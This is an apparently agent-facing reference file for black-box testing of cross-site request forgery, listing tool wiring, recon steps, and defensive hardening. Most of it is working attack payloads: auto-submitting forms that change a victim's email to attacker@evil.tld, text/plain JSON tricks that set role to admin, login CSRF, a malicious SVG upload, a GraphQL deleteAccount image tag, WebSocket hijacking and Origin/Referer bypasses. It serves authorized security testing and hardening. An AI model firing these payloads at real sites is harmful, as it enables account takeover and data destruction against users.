---
name: CSRF
description: Reference for testing cross-site request forgery covering SameSite nuance, token weakness patterns, content-type and method bypasses, JSON-as-form tricks, GraphQL / WebSocket CSRF, and login CSRF.
---

# CSRF

Reference for finding cross-site request forgery in cookie-authenticated flows. Pull this in when the target uses cookie sessions (or HTTP auth) and you need a probe matrix for token strictness, Origin / Referer enforcement, SameSite behavior, and content-type / method bypasses.

> Black-box scope: probes drive HTTP and observe browser navigation behavior. Bearer-token-only APIs (no cookies, no HTTP auth) are not CSRF-prone unless they also accept ambient credentials.

## Tool wiring

| Action | Tool | Notes |
|---|---|---|
| Single-request probe | `execute_curl` | Bind the victim's session cookie to test "what reaches the server." |
| Cross-origin browser test | `execute_playwright` | Host a tiny HTML page locally; trigger from a different origin. |
| Capture session model | `execute_curl -i` | Read `Set-Cookie` for `HttpOnly`, `Secure`, `SameSite`. |
| Token strength analysis | `execute_code` | Collect N tokens; entropy + structural analysis. |

## Reconnaissance

### Session model

```
execute_curl url: "https://target.tld/login" method: "POST" headers: "Content-Type: application/x-www-form-urlencoded" data: "u=alice&p=pass" -i
# Inspect each Set-Cookie:
#   HttpOnly    (good for XSS; not for CSRF)
#   Secure      (required when SameSite=None)
#   SameSite=Strict|Lax|None
```

Quick taxonomy:

| SameSite | Cross-site GET | Cross-site POST | CSRF risk |
|---|---|---|---|
| `Strict` | Cookie not sent | Cookie not sent | Very low |
| `Lax` (default in modern browsers) | Top-level GET sent | Cookie not sent | GET-state-changes still risky |
| `None` (with `Secure`) | Sent | Sent | Standard CSRF surface |
| Missing attribute | Browser default = `Lax` for many; some treat as `None` | Same | Often surprising |

### Token surface

```
# Hidden form input
<input type="hidden" name="_csrf" value="...">
# Meta tag
<meta name="csrf-token" content="...">
# Custom header (often X-CSRF-Token, X-XSRF-Token)
# Double-submit cookie pattern: cookie value mirrors header value
```

Strength tests on the token:

| Test | Probe |
|---|---|
| Remove the token | Server returns 200 -> CSRF |
| Send empty value | Same |
| Reuse across sessions | Token bound to user/session? |
| Reuse across users | Predictable allocation |
| Reuse across method/path | Per-route binding missing |
| Tokens in GET URL | Logged in proxies, referer leaks |
| Predictable structure | Sequential, base64 of timestamp, etc. |

### Method and content-type

```
# Try state-changing GETs
GET /api/account/delete

# Method override
POST /api/users/123 with header X-HTTP-Method-Override: DELETE
POST /api/users/123 with body _method=DELETE

# Simple content-types (no preflight)
Content-Type: application/x-www-form-urlencoded
Content-Type: multipart/form-data
Content-Type: text/plain
```

`text/plain` is the JSON-bypass classic: many JSON APIs accept the body if the parser is content-type-agnostic.

### Captured-traffic workflow (proxy_brain tools)

If HTTP Traffic Capture is enabled, source and drive this from the recorded history (proxy_brain only see traffic that crossed the capture proxy).

- `redamon.get id part:"response"` / `redamon.query` reads the captured session model (each `Set-Cookie` with its `SameSite` / `Secure` / `HttpOnly`).
- Token-strictness via `redamon.replay` on a captured state-change request: `dropHeaders:["X-CSRF-Token"]`, or a body edit emptying the `_csrf` field, checking the action still succeeds (200 / state changed).
- The same request with `headers:{"X-HTTP-Method-Override":"DELETE"}` or `headers:{"Content-Type":"text/plain"}` tests the method-override and JSON-as-form bypasses.
- Auth-context swap (`dropHeaders` plus a different session `cookie`) proves cross-user / cross-session token reuse.
- If the anti-CSRF token is **minted in client JS** (never in the raw HTML), `redamon.replay` alone cannot post the form. Read the token with the browser, then hand it to replay, all in one proxy_brain block: `b = redamon.browser(txn_id); b.goto("/account"); tok = b.eval("document.querySelector('input[name=csrf]').value"); b.close(); redamon.replay(txn_id, {"param": {"csrf": tok, "email": "attacker@evil.tld"}})`. Read `redamon.manual("browser")`.

Caveat: the browser is host-pinned to the origin (host+port+scheme), so it proves the same-origin token flow but not the cross-origin SameSite / Origin property — that still needs `execute_playwright` with an attacker origin.

## Attack matrix

### Navigation CSRF (auto-submit form)

```html
<form id="x" action="https://target.tld/api/email/change" method="POST" enctype="application/x-www-form-urlencoded">
  <input name="email" value="attacker@evil.tld">
</form>
<script>document.getElementById('x').submit()</script>
```

Hosted on attacker.tld; victim visits while logged in. Cookie `SameSite=None` (or unset) is required.

### JSON-as-form

```html
<form action="https://target.tld/api/users/me" method="POST" enctype="text/plain">
  <input name='{"role":"admin","x":"' value='bar"}'>
</form>
```

Result body: `{"role":"admin","x":"=bar"}`. Parsers that accept `text/plain` and tolerate the trailing `=bar` reconstruct valid JSON. `enctype="application/x-www-form-urlencoded"` with crafted `name=value` likewise reconstructs JSON for lenient parsers.

### Multipart-as-JSON

Some frameworks parse JSON parts inside multipart bodies. Send `multipart/form-data` with a part `Content-Type: application/json` and the JSON body inside.

### Login CSRF

Force the victim's browser to log in with attacker credentials so subsequent victim actions land in the attacker's account (e.g. saved payment methods, search history).

```html
<form action="https://target.tld/login" method="POST">
  <input name="user" value="attacker">
  <input name="password" value="attacker_secret">
</form>
<script>document.forms[0].submit()</script>
```

### Logout CSRF

Force logout to clear session + CSRF token, then chain login CSRF.

### OAuth / OIDC CSRF

| Probe | Outcome |
|---|---|
| Strip `state` from `/authorize` request | Login CSRF (attacker's IdP session bound to victim) |
| `/oauth/connect` reachable cross-origin without origin check | Account-linking CSRF |
| `/logout` accepts top-level GET | Logout CSRF chain |

See `/skill oauth_oidc` for the full flow.

### File upload CSRF

```html
<form action="https://target.tld/api/upload" method="POST" enctype="multipart/form-data">
  <input type="file" name="f" id="f">
</form>
<script>
  const blob = new Blob(["<svg onload='...'>"], {type:"image/svg+xml"});
  const dt = new DataTransfer();
  dt.items.add(new File([blob], "evil.svg", {type:"image/svg+xml"}));
  document.getElementById("f").files = dt.files;
  document.forms[0].submit();
</script>
```

Only works under specific browser conditions (drag/drop / clipboard); cleaner via tag-driven uploads if the endpoint accepts URL-fetched content.

### Admin action CSRF

Admin / staff routes often skip CSRF tokens because the team assumes the back-office is "trusted." Probe each admin route with anon-cross-origin POSTs.

### GraphQL CSRF

Cookie-authed GraphQL is CSRF-prone if it accepts:

- GET queries: `GET /graphql?query=mutation+...`
- POST `application/x-www-form-urlencoded`: `query=mutation%20...`
- POST `multipart/form-data` (graphql-multipart spec)
- Persisted queries via GET

```html
<img src="https://target.tld/graphql?query=mutation{deleteAccount}">
```

### WebSocket CSRF (CSWSH)

Browsers send cookies on the WebSocket handshake. Without server-side `Origin` validation, a cross-origin attacker page can open an authenticated socket and issue commands.

```javascript
const ws = new WebSocket("wss://target.tld/ws");
ws.onopen = () => ws.send(JSON.stringify({op:"deleteAccount"}));
```

Probes:

```
execute_curl url: "wss://target.tld/ws" headers: "Origin: https://attacker.tld\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Version: 13\nSec-WebSocket-Key: test==\nCookie: session=$VICTIM"
# Response 101 + no Origin reject -> CSWSH-prone
```

## Bypass techniques

### SameSite nuance

- Cookies without `SameSite` default to `Lax` in Chrome / Firefox / Edge but `None` on some legacy clients (older Safari, embedded WebViews). Test cross-browser when impact warrants.
- Lax exempts top-level GET navigations: any state change behind GET is exploitable from a top-level link.
- Cookies set in iframes have different applicability rules; `<iframe sandbox>` flips behavior.

### Origin / Referer

- Servers that accept `Origin: null` (sandbox iframes, `data:` URLs) are exploitable from those contexts.
- Servers that fall back to substring matches (`Referer.startsWith("https://target.tld")`) are bypassable with `https://target.tld.attacker.tld/`.
- Stripping Referer via `<meta name="referrer" content="no-referrer">` or `Referrer-Policy` from attacker page may force lenient validators to allow the request.

### Method override

```
# Body-based
POST /api/users/123  body: _method=DELETE
# Header-based
POST /api/users/123  header: X-HTTP-Method-Override: DELETE
# Header alt
POST /api/users/123  header: X-Method-Override: DELETE
```

### Token weakness

| Pattern | Why it fails |
|---|---|
| Token in Cookie only (no header / form) | Attacker-controlled JS reads cookie via XSS |
| Same token across sessions | Cross-user replay |
| Static / app-wide token | Forge from a single capture |
| Token in URL | Leaks via Referer / proxy logs |
| Double-submit without `Secure` | Attacker subdomain can set cookie |

## Validation shape

A clean CSRF finding includes:

1. A minimal HTML payload (or curl recipe) that triggers the state change.
2. Two browser screenshots / page-state dumps: before and after.
3. Network capture (Playwright trace) showing the cross-origin request reaching the server with the victim's cookie.
4. Confirmation that the action persisted (the user's email actually changed, the resource actually deleted).
5. SameSite / token / Origin behavior documented; cross-browser if relevant.

## False positives

- Token verification present, bound to session, required on every state change.
- Origin / Referer enforced consistently across content types.
- `SameSite=Strict` cookies and no method that accepts ambient credentials.
- Pure bearer-token APIs with no cookies / HTTP auth.
- Idempotent / non-sensitive operations only.

## Hardening summary

- Use `SameSite=Lax` (or `Strict` for sensitive flows). For cross-site embedded contexts, `SameSite=None; Secure` and a token.
- Per-session, per-user, per-route CSRF tokens; reject empty / missing.
- Verify `Origin` (preferred) or `Referer` on every state-changing request. Reject `null` unless explicitly required.
- Reject simple content-types (`text/plain`) on JSON endpoints; require `application/json` on JSON APIs and validate before parsing.
- Disable method override on public endpoints.
- Validate WebSocket `Origin` server-side on the handshake.

## Hand-off

```
Login CSRF chain                  -> /skill oauth_oidc (state strip), built-in brute_force_credential_guess
JSON-as-form bypass               -> file as Content-Type Confusion + CSRF
Method override + admin action    -> escalate as combined finding
WebSocket CSRF                    -> /skill graphql (subscription section), or dedicated WebSocket skill when shipped
File upload CSRF                  -> built-in / community file_upload skill
```
